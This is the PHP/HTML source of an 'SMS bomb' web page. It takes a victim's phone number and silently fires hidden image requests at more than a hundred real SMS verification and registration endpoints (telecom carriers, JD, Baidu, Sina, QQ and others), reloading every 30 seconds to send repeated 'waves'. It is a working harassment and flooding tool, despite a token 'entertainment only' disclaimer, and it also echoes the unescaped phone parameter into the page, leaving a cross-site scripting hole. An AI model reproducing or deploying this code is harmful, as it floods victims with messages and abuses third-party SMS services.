<?php header("Location:http://smsbombs.duapp.com/"); ?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>SMS_BOMB&middot;短信炸弹开源版</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="">

    <!-- CSS -->
    <link href="http://wssgcg1213.qiniudn.com/bootstrap.min.css" rel="stylesheet">
    <style type="text/css">

      /* Sticky footer styles
      -------------------------------------------------- */

      html,
      body {
        height: 100%;
        /* The html and body elements cannot have any padding or margin. */
      }

      /* Wrapper for page content to push down footer */
      #wrap {
        min-height: 100%;
        height: auto !important;
        height: 100%;
        /* Negative indent footer by it's height */
        margin: 0 auto -60px;
      }

      /* Set the fixed height of the footer here */
      #push,
      #footer {
        height: 60px;
      }
      #footer {
        background-color: #f5f5f5;
      }

      /* Lastly, apply responsive CSS fixes as necessary */
      @media (max-width: 767px) {
        #footer {
          margin-left: -20px;
          margin-right: -20px;
          padding-left: 20px;
          padding-right: 20px;
        }
      }



      /* Custom page CSS
      -------------------------------------------------- */
      /* Not required for template or sticky footer method. */

      #wrap > .container {
        padding-top: 60px;
      }
      .container .credit {
        margin: 20px 0;
      }

      code {
        font-size: 80%;
      }

    </style>

    <!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
    <!--[if lt IE 9]>
      <script src="http://cdnjs.bootcss.com/ajax/libs/html5shiv/3.6.2/html5shiv.js"></script>
    <![endif]-->


  </head>

  <body>


    <!-- Part 1: Wrap all page content here -->
    <div id="wrap">

      <!-- Fixed navbar -->
      <div class="navbar navbar-fixed-top">
        <div class="navbar-inner">
          <div class="container">
            <button type="button" class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
              <span class="icon-bar"></span>
              <span class="icon-bar"></span>
              <span class="icon-bar"></span>
            </button>
            <a class="brand" href="http://SMS.treeforests.com/">SMS_BOMB</a>
            <div class="nav-collapse collapse">
              <ul class="nav">
                <li class="active"><a href="http://sms.treeforests.com/">主页/Info</a></li>
                
              </ul>
            </div><!--/.nav-collapse -->
          </div>
        </div>
      </div>

      <!-- Begin page content -->
      <div class="container">
        <div class="page-header">
          <h1>SMS_BOMB&nbsp;<small>---短信炸弹开源版</small></h1>
<p><span class="label label-important">本页面基于GPLV3<a href="index.txt">开源</a>,并托管于USA,请遵守美国法律.</span></p>
<p><span class="label label-warning"><a href="http://zhidao.baidu.com/question/587074155.html#best-answer-1470217964">度娘知道:短信轰炸实现原理</a></span></p>
  <p><span  class="label label-info" >本站API来源:http://v2excom.duapp.com/index.php.txt</span></p>
        </div>
      <form method="get" action="index.php?num=<?php echo $_GET['num']; ?>">
      <label><?php if($_GET['msg']=="num_error"){
        echo '<span class="label label-warning">请检查11位号码:</span>';
      }else{
        echo '<span class="label label-info">输入11位号码:</sapn>';
        }
        ?>
          </label>
      <input type="text" maxlength="11" name="num" value="<?php echo $_GET['num'];?>">
      
 <?php if(!$_GET['num']){echo '<button class="btn btn-primary" type="submit">启动炸弹!</button>';}
 else{echo '<button class="btn btn-warning" type="reset"><a href="http://sms.treeforests.com/">停止攻击!</a></button>';} ?>
      
      </form>
      <span class="label label-inverse">***仅供娱乐,请用自己手机测试***</span>
<?php 
$num=$_GET['num'];
if($num){
if (!checknum($num)){
  header("location:/index.php?msg=num_error");
}
else{
$n=$_GET['n']?$_GET['n']:0;
$n++;
  ?>
<div class="alert alert-success">
Well done! 正在发送第<?php echo $n;?>波炸弹. 30秒后自动发送第<?php echo $n+1; ?>波.&nbsp;<button class="btn btn-danger"><a style="color:#fff;" href="index.php?num=<?php echo $_GET['num']; ?>&n=<?php echo $n;?>" >手动发送第<?php echo $n+1; ?>波</a></button>
<script>
window.setTimeout("window.location='index.php?num=<?php echo $_GET['num']; ?>&n=<?php echo $n; ?>'",30000); 
</script>
</div>
<div style='display:none'>
<img src='http://member.1688.com//member/ajax/send_identity_code_by_mobile.do?callback=jQuery172007067019236274064_1376100939244&mobile=<?php echo $num;?>&area=86&isBizMobile=true' alt=''/>
<img src='https://affiliate-program.amazon.com/gp/associates/apply/assoc-ivs.html?phoneNumber=%2B86<?php echo $num;?>&operation=start&ts=1376044348191' alt=''/>
<img src='http://authleqr.sdo.com/lars/send-login-validate-code.jsaonp?callback=jQuery16206594030656120524_1341237419373&userId=<?php echo $num;?>' alt=''/>
<img src='http://member.tiancity.com/handler/GetPhoneRegAuthCodeHandler.ashx?a=135&userid=<?php echo $num;?>' alt=''/>
<img src='https://affiliate-program.amazon.com/gp/associates/apply/assoc-ivs.html?phoneNumber=%2B86<?php echo $num;?>&operation=start&ts=1376099658512' alt=''/>
<img src='http://i.360.cn/smsApi/sendsmscode?account=<?php echo $num;?>&condition=2&r=0.8326570473673853&callback=QiUserJsonP1354551431282' alt=''/>
<img src='https://affiliate-program.amazon.com/gp/associates/apply/assoc-ivs.html?phoneNumber=%2B86<?php echo $num;?>&operation=start&ts=137606625123' alt=''/>
<img src='http://passport.cnyw.net//ajax.php?action=getverify&mobile=<?php echo $num;?>' alt=''/>
<img src='http://www.kunlun.com/?act=ajax.registGetMobileCode&mobile=<?php echo $num;?>&type=regist' alt=''/>
<img src='http://www.vko.cn/sendmobile.html?phone=<?php echo $num;?>&{}&_=1355879411734' alt=''/>
<img src='http://www.66call.com/register.aspx?__EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=%2FwEPDwUKLTYzNzEwOTYxOA9kFgJmD2QWDAIFDw8WAh4EVGV4dAULMTU5NTAxMjgwMzZkZAIHDw8WBh8ABQblj6%2FnlKgeCENzc0NsYXNzBQ5yX2NfY19yX2NoZWNrMR4EXyFTQgICZGQCDQ8PZBYCHgV2YWx1ZQUJamlhbmdsaWxpZAIPDw8WBh8ABQbpgJrov4cfAQUOcl9jX2Nfcl9jaGVjazEfAgICZGQCEQ8PZBYCHwMFCWppYW5nbGlsaWQCEw8PFgYfAAUG6YCa6L%2BHHwEFDnJfY19jX3JfY2hlY2sxHwICAmRkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYCBQxJbWFnZUJ1dHRvbjEFDEltYWdlQnV0dG9uMoC6NmiwUtO9MaSDo%2BblDqWjloj5&txtact=<?php echo $num;?>&hidfoc=&hidisOk=1&txtpwd=jianglili&txtrepwd=jianglili&txtcode=&ImageButton1.x=59&ImageButton1.y=11' alt=''/>
<img src='https://affiliate-program.amazon.com/gp/associates/apply/assoc-ivs.html?phoneNumber=%2B86<?php echo $num;?>&operation=start&ts=<?php echo $num;?>' alt=''/>
<img src='http://register.sdo.com/gaea/SendPhoneMsg.ashx?page=REG&mobile=<?php echo $num;?>' alt=''/>
<img src='http://wap.easou.com/sms.e?name=%e8%93%9d%e8%93%9d%e5%a4%a9%e7%a9%ba&mobile=<?php echo $num;?>&action=sms&usid=9&' alt=''/>
<img src='http://www.gewara.com/ajax/mobile/register.xhtml?mobile=<?php echo $num;?>&captchaId=&captcha=' alt=''/>
<img src='http://w.sohu.com/t2/tologin.do?mnd=<?php echo $num;?>&qr=1' alt=''/>
<img src='http://www.66call.com/register.aspx?__EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=%2FwEPDwUKLTYzNzEwOTYxOA9kFgJmD2QWDAIFDw8WAh4EVGV4dAULMTU5NTAxMjgwMzZkZAIHDw8WBh8ABQblj6%2FnlKgeCENzc0NsYXNzBQ5yX2NfY19yX2NoZWNrMR4EXyFTQgICZGQCDQ8PZBYCHgV2YWx1ZQUJamlhbmdsaWxpZAIPDw8WBh8ABQbpgJrov4cfAQUOcl9jX2Nfcl9jaGVjazEfAgICZGQCEQ8PZBYCHwMFCWppYW5nbGlsaWQCEw8PFgYfAAUG6YCa6L%2BHHwEFDnJfY19jX3JfY2hlY2sxHwICAmRkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYCBQxJbWFnZUJ1dHRvbjEFDEltYWdlQnV0dG9uMoC6NmiwUtO9MaSDo%2BblDqWjloj5&txtact=<?php echo $num;?>&hidfoc=&hidisOk=1&txtpwd=zhasini&txtrepwd=zhasini&txtcode=&ImageButton1.x=59&ImageButton1.y=11' alt=''/>
<img src='http://wap.dm.10086.cn/X/o/3455101/447117/mva0?a=/enduser/querySMSValiCodeByWap20.action&templateDir=template&theme=simple&name=querySMSValiCode&id=querySMSValiCode&downId=&operateType=1&isPass=true&user.accountName=<?php echo $num;?>&Submit=%E4%B8%8B%E4%B8%80%E6%AD%A5' alt=''/>
<img src='http://a.10086.cn/pams2/s/s.do?c=204&j=l&lpt=1&mobile=<?php echo $num;?>&p=72' alt=''/>
<img src='http://read.10086.cn/www/firstpage/getValidateCode.action?phone=<?php echo $num;?>&sf=0' alt=''/>
<img src='http://read.10086.cn/www/NiceNameAjax?msisdn=<?php echo $num;?>&e_cm=cmmobile' alt=''/>
<img src='https://cmpay.10086.cn/service/send_chk_no.xhtml?REG_MBL_NO=<?php echo $num;?>&SMS_CD=URM001&typ=Y&r=0.9636801626045905' alt=''/>
<img src='https://feixin.10086.cn/account/RegisterLv3Ajax?stype=m&stext=<?php echo $num;?>' alt=''/>
<img src='http://my.feixin.10086.cn/password/findpasswordvalidate?type=0&account=<?php echo $num;?>' alt=''/>
<img src='http://218.206.191.106/idm/usermgr/usernameCheck?mobilePhone=<?php echo $num;?>' alt=''/>
<img src='http://go.10086.cn/index.do?method=doReg&mobile=<?php echo $num;?>&source=reg' alt=''/>
<img src='http://www.keepc.com/registerForMobileForCode.act?mobileNo=<?php echo $num;?>' alt=''/>
<img src='http://wap.cmread.com/sso/oauth2/msisdnRegister?e_l=1&amp;f=7718&amp;pg=221&msisdn=<?php echo $num;?>&passwd=1415926' alt=''/>
<img src='https://passport.jd.com/emReg/isMobileEngaged?mobile=<?php echo $num;?>&r=0.08241349037594953' alt=''/>
<img src='http://shoujibao.net/pams2/m/s.do?j=l&c=31879&p=73&mobile=<?php echo $num;?>&password=1415926' alt=''/>
<img src='http://club.service.autohome.com.cn/Ashx/CreateMobileCode.ashx?mobile=<?php echo $num;?>' alt=''/>
<img src='http://www.huggieshappyclub.com/Handler/Vcode.ashx?mobile=<?php echo $num;?>' alt=''/>
<img src='http://wap.buidq.com/wap/webcallService.aspx?tel=<?php echo $num;?>' alt=''/>
<img src='http://www.uwewe.com/get/IsUser.aspx?phone=<?php echo $num;?>&quhao=86' alt=''/>
<img src='http://www.uwewe.com/get/SendMessage.aspx?phone=<?php echo $num;?>&ccode=86&type=1' alt=''/>
<img src='http://www.66call.com/forgetpwd.aspx?ScriptManager1=UpdatePanel1|ImageButton2&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTExMjY2ODE5MTgPFgYeCFRpbWVTcGFuBqpmMwD38M%2BIHgRjb2RlBQQ0MjY1HgRhY2N0BQsxNTgzODgwMjA0MmQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgMFDEltYWdlQnV0dG9uMgUMSW1hZ2VCdXR0b24xBQxJbWFnZUJ1dHRvbjPdI0AXCiz2XIYks0CPZpmkSSEMDg%3D%3D&txtacct=<?php echo $num;?>&txtcode=7426&txtpwd=&txtrepwd=&ImageButton2.x=76&ImageButton2.y=18' alt=''/>
<img src='http://www.wcall.net/ajax/send_captcha.jsp?mobile=86<?php echo $num;?>' alt=''/>
<img src='http://www.uwewe.com/wap/reg.aspx?__VIEWSTATE=%2FwEPDwUKLTg3MDQ4MjcyNGRkTWAEkK5GOtWg8l1At7LuQLJsrtk%3D&__EVENTVALIDATION=%2FwEWBwLf79jTDQL7h7XWDwKd%2B7q4BwLinreAAgLChPzDDQK7q7GGCAKM54rGBiIS9Dt7i1j1h%2BDtH9EcyHIWJVZf&txtacct=<?php echo $num;?>&txtpwd=&txtRepwd=&txtCode=&Button2=%E8%AF%AD%E9%9F%B3%E8%8E%B7%E5%8F%96%E9%AA%8C%E8%AF%81%E7%A0%81' alt=''/><img src='http://www.gewara.com/ajax/mobile/register.xhtml?mobile=<?php echo $num;?>&captchaId=&captcha=' alt=''/>
<img src='http://www.gewara.com/checkMember.xhtml?tag=mobile&itemvalue=<?php echo $num;?>' alt=''/>
<img src='http://www.dianping.com/ajax/json/account/reg/mobile/send?m=<?php echo $num;?>' alt=''/>
<img src='http://www.ushi.com/openRegU!checkNumber.jhtml?basicProfile.mobile=<?php echo $num;?>' alt=''/>
<img src='http://www.efala.net/newfindpwbysms.flow?byname=<?php echo $num;?>' alt=''/>
<img src='http://zj.189.cn/zjpr/member/authentication/sendValidatePhone.html?phone=<?php echo $num;?>' alt=''/>
<img src='http://weibo.com/signup/v5/formcheck?type=mobile&value=<?php echo $num;?>&__rnd=1363496469546' alt=''/>
<img src='http://api.open.uc.cn/cas/register/mobi/resendVCode?uc_param_str=einisivelafrpf&client_id=20033&from=cas&mobi=<?php echo $num;?>' alt=''/>
<img src='http://ptlogin.4399.com/ptlogin/sendRegPhoneCode.do?phone=<?php echo $num;?>&appId=www_home&v=1&v=1' alt=''/>
<img src='http://i.youku.com/u/bindMobile?__rt=1&__ro=&mobile=<?php echo $num;?>' alt=''/>
<img src='https://safe.renren.com/actions/changesafemobile/sendmobilecaptcha?ajax-type=json&token=1ZhR7iv65SgaNXliuA7mujgTO3s3k1CL&mobile=<?php echo $num;?>&requestToken=496404876&_rtk=e95787e6' alt=''/>
<img src='http://club.service.autohome.com.cn/Ashx/CreateMobileCode.ashx?mobile=<?php echo $num;?>' alt=''/>
<img src='http://service.zol.com.cn/user/ajax/sendMsgCode.php?phone=<?php echo $num;?>' alt=''/>
<img src='https://login.vancl.com/login/BeginRegister.ashx?action=sendmobilecode&key=<?php echo $num;?>&validatecode=&_=1363498730859' alt=''/>
<img src='http://passport.eastmoney.com/chkphone.aspx?flag=check&param=<?php echo $num;?>' alt=''/>
<img src='http://passport.eastmoney.com/chkphone.aspx?flag=resend&param=<?php echo $num;?>' alt=''/>
<img src='http://passport.cntv.cn/mobileRegister.do?msisdn=<?php echo $num;?>&verfiCodeType=1&method=getRequestVerifiCode' alt=''/>
<img src='http://register.zhenai.com/register/validateMobile.jsps?mobile=<?php echo $num;?>' alt=''/>
<img src='http://reg.jiayuan.com/libs/xajax/reguser.server.php?processSendOrUpdateMessage&xajax=processSendOrUpdateMessage&xajaxargs%5B%5D=%3Cxjxquery%3E%3Cq%3Emobile%3Dd$%3C%2Fq%3E%3C%2Fxjxquery%3E&xajaxargs%5B%5D=mobile&xajaxr=1363500615734' alt=''/>
<img src='https://passport.jd.com/emReg/sendMobileCode?mobile=<?php echo $num;?>&r=0.9010949897739119' alt=''/>
<img src='https://member.suning.com/emall/SNCellPhoneRegisterCmd?actionType=reSendValCode&logonId=<?php echo $num;?>&URL=SNUserRegisterComfirmView&_=1363500974671' alt=''/>
<img src='http://account.iqiyi.com/security/secret/mobile/adm.action?time=1363501090218&mobile=<?php echo $num;?>' alt=''/>
<img src='http://www.skywldh.com/registerForMobileForCode.act?mobileNo=<?php echo $num;?>&smSecurityCode=' alt=''/>
<img src='http://wap.skywldh.com/index.php?register&flag=flag&phone=<?php echo $num;?>&mss=on' alt=''/>
<img src='http://zg51.net/web/customer/forgetPwd_up.asp?customermobile=<?php echo $num;?>&verify=01f735f97f1af959&checkcodeflag=1' alt=''/>
<img src='http://www.qqvoice.com/free/getExpCode.do?_isAjaxRequest=true&phonemail=<?php echo $num;?>&type=1&randvalue=' alt=''/>
<img src='http://www.feiin.com/findAccountInfoByAccount.act?mobile=<?php echo $num;?>' alt=''/>
<img src='http://wap.feiin.cn/index.php?register?phone=<?php echo $num;?>' alt=''/>
<img src='http://www.feiin.cn/bindMobileCode.act?account=<?php echo $num;?>&quhao=0086' alt=''/>
<img src='http://www.139talk.com/user/regnum.html?phone=<?php echo $num;?>&type=1&key=ofoedsv0oeg6aari1m3ig0nsc5' alt=''/>
<img src='http://www.139talk.com/invite/invitesms.html?phone=<?php echo $num;?>&key=ofoedsv0oeg6aari1m3ig0nsc5' alt=''/>
<img src='http://www.139talk.com/invite/regnum.html?phone=<?php echo $num;?>&type=1&key=ofoedsv0oeg6aari1m3ig0nsc5' alt=''/>
<img src='http://www.139talk.com/invite/register.html?p=cGhvbmV8MTU4Mzg4MDIwNDJ8Y2hrY29kZXw4OTczfGRhdGV8MjAxMy0wMy0xNw==' alt=''/>
<img src='http://www.139talk.com/download/smsdownload.html?popPhone=<?php echo $num;?>&phoneType=Iphone&popKey=ofoedsv0oeg6aari1m3ig0nsc5' alt=''/>
<img src='http://www.159talk.com/user/regnum.html?phone=<?php echo $num;?>&type=1&key=h5u9albk8oveqm17rfo6kvo226' alt=''/>
<img src='http://my.tv.sohu.com/user/reg/getmstatus.do?passport=<?php echo $num;?>' alt=''/>
<img src='http://sso.letv.com/user/mobileRegCode/mobile/<?php echo $num;?>/mobilecodeletvid/k961601363512388' alt=''/>
<img src='http://register.sdo.com/gaea/SendPhoneMsg.ashx?page=REG&mobile=<?php echo $num;?>' alt=''/>
<img src='http://download.feixin.10086.cn/download/downloadFLToMobile.action?id=50&no=<?php echo $num;?>&isCheckCode=1' alt=''/>
<img src='http://my.feixin.10086.cn/password/sendfindpasswordsms?MobileNo=<?php echo $num;?>' alt=''/>
<img src='http://f.10086.cn/im5/register/checkMobile.action?mobileNo=<?php echo $num;?>' alt=''/>
<img src='http://zc.qq.com/cgi-bin/bd/send_sms?acc=<?php echo $num;?>&bkn=1656136920&v=0.6187287989762199' alt=''/>
<img src='http://weibo.com/signup/v5/formcheck?type=sendsms&value=<?php echo $num;?>&__rnd=1364610012046http://hm.baidu.com/hm.gif?cc=1&ck=1&cl=16-bit&ds=1280x800&ep=%E8%8E%B7%E5%8F%96%E9%AA%8C%E8%AF%81%E7%A0%81*%E7%82%B9%E5%87%BB&et=4&fl=11.6&ja=1&ln=zh-cn&lo=0&nv=1&rnd=2125197633&si=4cd143d67831005438c65f586314c582&st=3&su=http://club.autohome.com.cn%2Fbbs%2Fthread-c-148-2031217-1.html&v=1.0.40&lv=1&api=8_0&tt=%E7%94%A8%E6%88%B7%E6%B3%A8%E5%86%8C_%E6%B1%BD%E8%BD%A6%E4%B9%8B%E5%AE%B6' alt=''/>
<img src='https://www.qianwang365.com/uc/ajax/obtainSecurityCode4Regist.html?username=<?php echo $num;?>' alt=''/>
<img src='http://www.efala.net/getcode.flow?phone=<?php echo $num;?>&cardno=&code=&' alt=''/>
<img src='http://passport.wanmei.com/NoteAction.do?method=sendRegCode&mobile=<?php echo $num;?>' alt=''/>
<img src='http://biz.b2b.cn/member/SendCode.ashx?temptime=1365067755281&m=<?php echo $num;?>' alt=''/>
<img src='http://www.kunlun.com/index.php?act=ajax.checkUsername&user_name=<?php echo $num;?>' alt=''/>
<img src='http://reg.email.163.com/unireg/call.do?cmd=added.mobileverify.sendAcode&mobile=<?php echo $num;?>&uid=<?php echo $num;?>%40163.com&mark=mobile_start' alt=''/>
<img src='http://passport.eastmoney.com/chkphone.aspx?flag=resend&param=<?php echo $num;?>' alt=''/>
<img src='http://user.syyx.com/ajax/users/checkusername.aspx?u=<?php echo $num;?>&r=0.42031912299903756' alt=''/>
<img src='http://www.keepc.com/findAccountInfoByAccount.act?mobile=<?php echo $num;?>' alt=''/>
<img src='http://service.zol.com.cn/user/ajax/sendMsgCode.php?phone=<?php echo $num;?>' alt=''/>
<img src='http://gwpassport2.woniu.com/v2/checkusername?jsoncallback=jQuery172013263149083391296_1365068016801&username=<?php echo $num;?>&_=1365068030671' alt=''/>
<img src='http://passport.upaidui.com/mobiles/send_validation_code?mobile_number=<?php echo $num;?>' alt=''/>
<img src='http://user.51wan.com/reg_index_check_0.html?type=username&is=mobile&username=<?php echo $num;?>' alt=''/>
<img src='http://interface.game.renren.com/ActivityCenter/?catalog=plugins&gameid=all&aname=reg&method=reg.subUserInfo&mobile=<?php echo $num;?>&callback=jQuery17204292543791520399_1365068164751&_=1365068180406' alt=''/>
<img src='http://my.xoyo.com/register/NewIsExist/?uid=<?php echo $num;?>' alt=''/>
<img src='http://member.tiancity.com/handler/GetPhoneRegAuthCodeHandler.ashx?a=0.016777698590329404&userid=<?php echo $num;?>' alt=''/>
<img src='http://member.changyou.com/register/checkPhoneIsUsed.do?securityPhone=<?php echo $num;?>' alt=''/>
<img src='http://www.game5.com/member/sendRegisterVerifyCode?reg_mobile=<?php echo $num;?>' alt=''/>
<img src='http://passport.kongzhong.com/acc.do?m=sendPhoneVcodeFast&callback=jQuery17200752385214847075_1364445730228&phone=<?php echo $num;?>&smsvcode=%E8%BE%93%E5%85%A5%E6%89%8B%E6%9C%BA%E8%8E%B7%E5%8F%96%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81&_=1364445764320' alt=''/>
<img src='http://www.pceggs.com/myaccount/mobile_ajax.aspx?refresh=0&i_mobileNo=<?php echo $num;?>' alt=''/>
<img src='http://www.9dapai.com/SMSAuthentication/SMSAuthenticationPage.aspx/btnGenerateCheckCode_Click?(Content)=%7Bcellnum%3A'<?php echo $num;?>'%7D' alt=''/>
<img src='http://www.veryzhun.com/ajax/register.asp?mobile=<?php echo $num;?>&areacode=86' alt=''/>
<img src='http://wap.callda.com/register_2.jsp?phoneNumber=<?php echo $num;?>' alt=''/>
<img src='http://www.200call.com/index.php?action=vphone?uphone=<?php echo $num;?>' alt=''/>
<img src='http://wap.12580call.cn/index.php?register&phone=<?php echo $num;?>' alt=''/>
<img src='http://w.yunpan.360.cn/intf.php?method=Sms.issue&qid=177256015&devtype=box&v=1.9.2.1245&devid=5b5b55bfc9f1f3113963b1f1350adc65&devname=&rtick=6969759&sign=aa8d029e8036f3f9d555956388dc4c57&ofmt=xml&pid=home&mobile=<?php echo $num;?>&contype=mdu&token=3708649921.6.95535003.177256015.1366401362' alt=''/>
<img src='http://member.tiancity.com/handler/GetPhoneRegAuthCodeHandler.ashx?a=0.6334787302703851&userid=<?php echo $num;?>' alt=''/>
<img src='http://passport.eastmoney.com/chkphone.aspx?flag=resend&param=<?php echo $num;?>' alt=''/>
<img src='http://passport.17u.cn/Member/RegisterHandler.ashx?action=phone&phone=<?php echo $num;?>&iid=0.6011805873638694' alt=''/>
<img src='http://3g.163.com/t/signup.do?mobile=<?php echo $num;?>&sub=%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81%E7%9F%AD%E4%BF%' alt=''/>
<img src='http://m.mail.163.com/reg.s?regtype=mobile&method=registerMobile&mobile_num=<?php echo $num;?>&password=testtest&password2=testtest&action=%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%86%8C%E4%BF%A1%E6%81%AF=400' alt=''/>
<img src='http://account.jzyx.com/common/send-sms.html?tel=<?php echo $num;?>' alt=''/>
<img src='http://t.sdo.com/home/SendSms?mobile=<?php echo $num;?>' alt=''/>
<img src='http://txz.sdo.com/common/msgsend/?m=<?php echo $num;?>&t=2&method=SendAPPDownLoadSMSCallback&fromid=weblogin&r=0.9407026621045355' alt=''/>
<img src='https://mcas.sdo.com/authen/checkAccountType.jsonp?callback=checkAccountType_JSONPMethod&inputUserId=<?php echo $num;?>' alt=''/>
<img src='http://authleqr.sdo.com/lars/check-account-types.jsonp?callback=jQuery16202903677772887056_1353757072377&userId=<?php echo $num;?>&_=1353757193062' alt=''/>
<img src='https://reg.95538.cn/userreg/AjaxHandler.ashx?method=getPhoneCode?mobilePhone=<?php echo $num;?>&type=0' alt=''/>
<img src='http://u.baidu.com/?module=default&controller=Reg&action=sendSMS&b1350745948890=1&mobile=<?php echo $num;?>&appid=3&ucname=huisexinxi' alt=''/>
<img src='http://as.baidu.com/a/msg?act=sendtomobile&f=topic_3001_2_0&mobile=<?php echo $num;?>&docid=1439803&ctime=1353852949890' alt=''/>
<img src='http://as.baidu.com/a/msg?act=sendtomobile&f=web_alad_6%40next%40software_1003_6&mobile=<?php echo $num;?>&docid=1346020&ctime=1350747592671' alt=''/>
<img src='http://api.pengyou.com/json.php?mod=mobilebind&act=sendsms&mobile=<?php echo $num;?>&g_tk=null' alt=''/>
<img src='http://www.maiduo.com/handler/Register/Register.ashx?act=check&mobile=<?php echo $num;?>&checkCode=undefined' alt=''/>
<img src='http://www.sinosig.com/auth/regist_resetMsg.action?sso_userName=<?php echo $num;?>&isAjaxSubmit=true' alt=''/>
<img src='http://www.pubyun.com/accounts/signup_vcode/4449056/?mobile=<?php echo $num;?>' alt=''/>
<img src='http://dealer.autohome.com.cn/Handler/SendMessage.ashx?action=sendcode&mob=<?php echo $num;?>' alt=''/>
<img src='http://yuyue.shdc.org.cn/User/ajaxSendConfirmCode.aspx?mobile=<?php echo $num;?>' alt=''/>
<img src='http://reg.ztgame.com/registe/mobilePhoneRegister?type=isBindPhoneNum&phoneNum=<?php echo $num;?>' alt=''/>
<img src='http://www.baixing.com/ajax/auth/sendCode/?type=resetPassword&mobile=<?php echo $num;?>' alt=''/>
<img src='http://mail.sina.com.cn/cgi-bin/phonecode.php?phonenumber=<?php echo $num;?>' alt=''/>
<img src='http://passport.q.com.cn/register/index/ajaxcheckmobile/?mobile=<?php echo $num;?>' alt=''/>
<img src='http://yun.baidu.com/account/v1/api/sendacodenormal?dest=<?php echo $num;?>' alt=''/>
<img src='https://reg.passport.the9.com/api/chk_loginname?loginname=<?php echo $num;?>&accounttype=reg_mobile' alt=''/>
<img src='https://login.sina.com.cn/signup/check_user.php?format=json&from=mobile&name=<?php echo $num;?>' alt=''/>
<img src='http://js.ac.10086.cn/jsauth/reg?method=sendVerCode&=<?php echo $num;?>' alt=''/>
<img src='http://my.xoyo.com/register/isExist/0.8101254514227967?uid=<?php echo $num;?>&type=mobile' alt=''/>
<img src='http://member.changyou.com/register/checkPhoneIsUsed.do?securityPhone=<?php echo $num;?>' alt=''/>
<img src='https://reg.91.com/AjaxAction/AC_register.ashx?action=verifyusernameofmobile&txtUserNameOfMobile=<?php echo $num;?>' alt=''/>
<img src='http://211.136.93.21/hfwebbusi/pay/saveOrder.do?mobileId=<?php echo $num;?>' alt=''/>
<img src='http://passport.wanmei.com/NoteAction.do?method=sendRegCode?mobile=<?php echo $num;?>' alt=''/>
<img src='http://authleqr.sdo.com/lars/check-account-types.jsonp?callback=jQuery16203658856788579764_1366925187811&userId=<?php echo $num;?>&_=1366925195670' alt=''/>
<img src='http://www.guahao.com/validcode/json/mobile/<?php echo $num;?>/REG_MOBILE/cebaf071614ac29f9ad6c692b474a46f?_=1366925898545' alt=''/>
<img src='http://chinatelecom.zc.qq.com/cgi-bin/send_sms?phonenum=<?php echo $num;?>&stype=1' alt=''/>
<img src='http://cas.sdo.com/authen/sendPhoneCheckCode.jsonp?callback=sendPhoneCheckCode_JSONPMethod&inputUserId=<?php echo $num;?>&type=3&appId=201&areaId=0&serviceUrl=' alt=''/>
<img src='http://sdo.com&productVersion=v5&frameType=3&locale=zh_CN&version=21&tag=20&authenSource=2&productId=2&_=1366924349498' alt=''/>
<img src='http://www.1732.com/public/ajax.aspx?app=resendcode&bindaccount=<?php echo $num;?>' alt=''/>
<img src='http://sign.kting.cn/register/getphoneverify/phone/<?php echo $num;?>' alt=''/>
<img src='http://m.xs8.cn/user/quick_signup.html?mobile=<?php echo $num;?>' alt=''/>
<img src='http://bbs.360che.com/ajax1.php?action=ds21&mobilenum=<?php echo $num;?>&inajax=1&ajaxtarget=ts' alt=''/>
<img src='http://pass.ledu.com/reg/mobilecode?type=reg&mobile=<?php echo $num;?>&r=0.7577109599155907' alt=''/>
<img src='http://www.52callme.com/Handler/SendVerifyCodeHandler.ashx?m=<?php echo $num;?>' alt=''/>
<img src='http://sso.letv.com/user/mobileRegCode/mobile/<?php echo $num;?>/mobilecodeletvid/c326961366927138' alt=''/>
<img src='http://www.sinosig.com/auth/regist_refresh.action?sso_userName=<?php echo $num;?>&resetSend=1' alt=''/>
<img src='https://sn.ac.10086.cn/sendMsgRequest?mobileNumber=<?php echo $num;?>' alt=''/>
<img src='https://fj.ac.10086.cn/SMSCodeSend?mobileNum=<?php echo $num;?>&validCode=0000&errorurl=https://fj.ac.10086.cn/4login/errorPage.jsp&name=menhu' alt=''/>
<img src='https://fj.ac.10086.cn/SMSCodeSend?mobileNum=<?php echo $num;?>&validCode=0000&errorurl=http://www.fj.10086.cn:80/service/login/send.jsp' alt=''/>
<img src='https://fj.ac.10086.cn/ssouser/sendMessage.do?mobileno=<?php echo $num;?>' alt=''/>
<img src='http://www.gs.10086.cn/gs_obsh_service/actionDispatcher.do?userMobile=<?php echo $num;?>' alt=''/>
<img src='https://sn.ac.10086.cn/sendMsgRequest?code=%E7%82%B9%E5%87%BB%E8%8E%B7%E5%8F%96%E9%AA%8C%E8%AF%81%E7%A0%81&mobileNumber=<?php echo $num;?>' alt=''/>
<img src='https://js.ac.10086.cn/jsauth/dzqd/pagSendDypass?umobile=<?php echo $num;?>' alt=''/>
<img src='http://gd.10086.cn/ngcrm/hall/SendRandomSms.action?mobile=<?php echo $num;?>&isReRequest=false' alt=''/>
<img src='http://liao.189.cn/ECP-Portals/phoneDown/download.do?phone=<?php echo $num;?>' alt=''/>
<img src='https://ecplive.cn/reg/servlet/ivrInvokeServlet?number=<?php echo $num;?>&flagNum=3' alt=''/>
</div>
<?php 
} //endifdisplay
}//endif$num
function checknum($num){
  $pattern = "/^[1]{1}[0-9]{10}$/";
  $rst = preg_match($pattern, $num ,$ary);
  if($rst!=1){
    return false;
  }
  else{
    return true;
  }
}
 ?> 
		
<!-- Baidu Button BEGIN -->
<br>
<!-- 将此标记放在您希望显示like按钮的位置 -->
<div class="bdlikebutton"></div>

<!-- 将此代码放在适当的位置，建议在body结束前 -->
<script id="bdlike_shell"></script>
<script>
var bdShare_config = {
	"type":"medium",
	"color":"green",
	"uid":"2966522",
